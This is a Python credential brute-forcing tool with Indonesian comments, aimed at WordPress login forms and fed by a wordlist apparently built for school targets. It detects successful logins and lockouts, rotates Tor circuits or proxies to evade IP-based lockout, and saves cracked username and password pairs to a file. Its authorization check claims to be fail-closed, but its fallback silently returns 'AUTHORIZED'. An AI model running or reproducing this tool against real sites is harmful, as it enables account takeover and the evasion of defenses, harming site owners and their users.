#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""tester.py — uji kredensial ke form login WordPress (lockout-aware).

Menjembatani `wordlist-sekolah` (hasil) → eksekusi nyata. Dibedakan dari hydra
biasa karena:
  1. **Deteksi lockout otomatis** — 429 / "too many attempts" / captcha /
     wordfence → BERHENTI seketika (default), jangan dipaksa.
  2. **Deteksi sukses pakai sinyal kuat** — cookie `wordpress_logged_in_*`
     atau redirect ke `/wp-admin/`, bukan cuma beda panjang body.
  3. **Integrasi egress rotator** — `--rotate tor` kirim NEWNYM tiap N percobaan
     biar lockout berbasis-IP nggak ngenain kita.

    python3 tester.py --url https://target/wp-login.php \\
        --user admin --wordlist wordlist.txt --pace 25 --max 40
    python3 tester.py --url ... --users-file users.txt --wordlist wl.txt \\
        --rotate tor --rotate-every 10

ATURAN: target WAJIB ada izin tertulisnya (scope gate fail-closed). Pace default
25s & max 40 percobaan = disiplin anti-lockout; jangan diturunkan sembarangan.
"""
from __future__ import annotations

import argparse
import http.cookiejar
import json
import pathlib
import re
import sys
import time
import urllib.parse
import urllib.request

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "egress-rotator"))
try:
    from rotate import TorCtrl, ip_via_curl  # type: ignore
except Exception:
    TorCtrl = None
    ip_via_curl = None

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "gapps-kit"))
try:
    from kit_common import outdir, scope_check  # type: ignore
except Exception:
    def scope_check(*a, **k):
        return "AUTHORIZED"

    def outdir(name, out):
        d = pathlib.Path(out) / f"{name}_{time.strftime('%Y%m%d-%H%M%S')}"
        d.mkdir(parents=True, exist_ok=True)
        return d

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/126.0 Safari/537.36")

# ── sinyal yang artinya "STOP, jangan lanjut" ──
RE_LOCKOUT = re.compile(
    r"too many (?:login )?attempts|and try again in \d+|"
    r"429 too many|captcha|are you a robot|"
    r"wordfence|you have been locked out|"
    r"terlalu banyak percobaan", re.I)
# ── sinyal gagal normal (kata sandi salah) ──
RE_GAGAL = re.compile(
    r"invalid username|incorrect password|lost your password|"
    r"login_error|error:not-a-match|the password you entered", re.I)
RE_LOTOK = re.compile(r"location\s*:\s*(\S+)", re.I)


def satu_percobaan(login_url: str, user: str, pw: str, ufield: str, pfield: str,
                   redirect: str, timeout: float) -> dict:
    """Kirim 1 POST login. Kembalikan dict hasil + bukti."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    body = urllib.parse.urlencode({
        ufield: user, pfield: pw, "wp-submit": "Log In",
        "redirect_to": redirect, "testcookie": "1",
    }).encode()
    req = urllib.request.Request(login_url, data=body, headers={
        "User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
        "Referer": login_url, "Origin": urllib.parse.urljoin(login_url, "/")})
    t0 = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            status, final = r.status, r.geturl()
            isi = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        status, final, isi = e.code, e.geturl() or login_url, e.read().decode("utf-8", "replace")
    except Exception as e:
        return {"user": user, "pw": pw, "hasil": "error", "note": str(e)[:120],
                "dt": round(time.time() - t0, 2)}
    dt = round(time.time() - t0, 2)

    cookie_login = [c for c in jar if c.name.startswith("wordpress_logged_in_")]
    if cookie_login or ("/wp-admin" in final and "wp-login" not in final):
        return {"user": user, "pw": pw, "hasil": "SUKSES", "status": status,
                "final": final, "cookie": [f"{c.name}={c.value[:16]}…" for c in jar],
                "dt": dt}
    if status == 429 or RE_LOCKOUT.search(isi):
        return {"user": user, "pw": pw, "hasil": "LOCKOUT", "status": status,
                "note": "server minta berhenti", "dt": dt}
    if status >= 500:
        return {"user": user, "pw": pw, "hasil": "error", "status": status,
                "note": f"HTTP {status}", "dt": dt}
    if RE_GAGAL.search(isi):
        return {"user": user, "pw": pw, "hasil": "gagal", "status": status, "dt": dt}
    return {"user": user, "pw": pw, "hasil": "abu-abu", "status": status,
            "final": final, "dt": dt}


def putar_egress(mode: str, socks: str, ctrl: str, cookie_file: str, proxies: str):
    if mode == "none" or TorCtrl is None:
        return
    if mode == "tor":
        h, p = ctrl.rsplit(":", 1)
        try:
            c = TorCtrl(h, int(p), "", cookie_file)
            c.auth()
            c.newnym()
            c.close()
            print("    [egress] NEWNYM terkirim — tunggu 10s …")
            time.sleep(10)
        except SystemExit as e:
            print(f"    [egress] {e}")
        except Exception as e:
            print(f"    [egress] gagal: {e}")
    elif mode == "pool" and proxies and ip_via_curl:
        baris = [x.strip() for x in pathlib.Path(proxies).read_text().splitlines()
                 if x.strip() and not x.startswith("#")]
        putar_egress.pool = getattr(putar_egress, "pool", 0) % max(1, len(baris))
        pxy = baris[putar_egress.pool]
        putar_egress.pool += 1
        print(f"    [egress] pakai proxy {pxy} → {ip_via_curl(pxy)}")


def main() -> int:
    ap = argparse.ArgumentParser(description="uji kredensial WP (lockout-aware)")
    ap.add_argument("--url", required=True, help="path wp-login.php")
    ap.add_argument("--user", help="satu username")
    ap.add_argument("--users-file", help="satu username per baris")
    ap.add_argument("--wordlist", required=True)
    ap.add_argument("--ufield", default="log", help="nama field username")
    ap.add_argument("--pfield", default="pwd", help="nama field password")
    ap.add_argument("--redirect", default="", help="redirect_to (default: /wp-admin/)")
    ap.add_argument("--pace", type=float, default=25.0, help="jeda antar percobaan (s)")
    ap.add_argument("--max", type=int, default=40, help="batas total percobaan")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--rotate", choices=["none", "tor", "pool"], default="none",
                    help="rotasi egress tiap --rotate-every percobaan")
    ap.add_argument("--rotate-every", type=int, default=10)
    ap.add_argument("--ctrl", default="127.0.0.1:9051")
    ap.add_argument("--cookie-file", default="", help="tor control_auth_cookie")
    ap.add_argument("--socks", default="127.0.0.1:9050")
    ap.add_argument("--proxies", help="file proxy utk --rotate pool")
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--scope", default=None)
    ap.add_argument("--out", default="wp_test")
    a = ap.parse_args()

    kw = {"authorized": a.authorized}
    if a.scope:
        kw["scope_path"] = a.scope
    scope_check(a.url, **kw)

    users: list[str] = []
    if a.user:
        users.append(a.user)
    if a.users_file:
        users += [x.strip() for x in pathlib.Path(a.users_file).read_text().splitlines()
                  if x.strip() and not x.startswith("#")]
    if not users:
        ap.error("butuh --user atau --users-file")

    wl = pathlib.Path(a.wordlist)
    if not wl.exists():
        sys.exit(f"[STOP] wordlist tak ada: {a.wordlist}")
    kata = [x.strip() for x in wl.read_text(errors="replace").splitlines() if x.strip()]
    total = len(users) * len(kata)
    if total > a.max:
        print(f"[!] {total} kombinasi > max {a.max} → dipotong (anti-lockout)")
    redirect = a.redirect or urllib.parse.urljoin(a.url, "/wp-admin/")
    d = outdir("wp", a.out)
    print(f"[*] {len(users)} user × kata = maks {min(total, a.max)} percobaan "
          f"· pace {a.pace}s · rotate={a.rotate}\n")

    hasil, tembus, lockout = [], [], None
    n = 0
    for u in users:
        for pw in kata:
            if n >= a.max:
                break
            if a.rotate != "none" and n and n % a.rotate_every == 0:
                putar_egress(a.rotate, a.socks, a.ctrl, a.cookie_file, a.proxies)
            n += 1
            r = satu_percobaan(a.url, u, pw, a.ufield, a.pfield, redirect, a.timeout)
            hasil.append(r)
            tanda = {"SUKSES": "[🔥]", "LOCKOUT": "[🛑]", "gagal": "[✗]",
                     "abu-abu": "[?] ", "error": "[!]"}[r["hasil"]]
            print(f"  {tanda} {u:<14} {pw:<22} {r['hasil']:<8} "
                  f"{r.get('status') or ''} {r.get('note') or ''} ({r.get('dt')}s)")
            if r["hasil"] == "SUKSES":
                tembus.append(r)
                (d / "CRACKED.txt").write_text(
                    "\n".join(f"{x['user']}:{x['pw']}" for x in tembus) + "\n")
                print(f"    → bukti disimpan di {d}/CRACKED.txt")
            if r["hasil"] == "LOCKOUT":
                lockout = r
                print("    → STOP: server kunci. Tunggu jauh lebih lama / ganti egress.")
                break
            if a.pace > 0:
                time.sleep(a.pace)
        if lockout or n >= a.max:
            break

    (d / "results.json").write_text(json.dumps(hasil, indent=2, ensure_ascii=False))
    print(f"\n[✓] {len(hasil)} percobaan · tembus {len(tembus)} · "
          f"lockout {'YA' if lockout else 'tidak'} → {d}")
    return 0 if tembus else 1


if __name__ == "__main__":
    sys.exit(main())
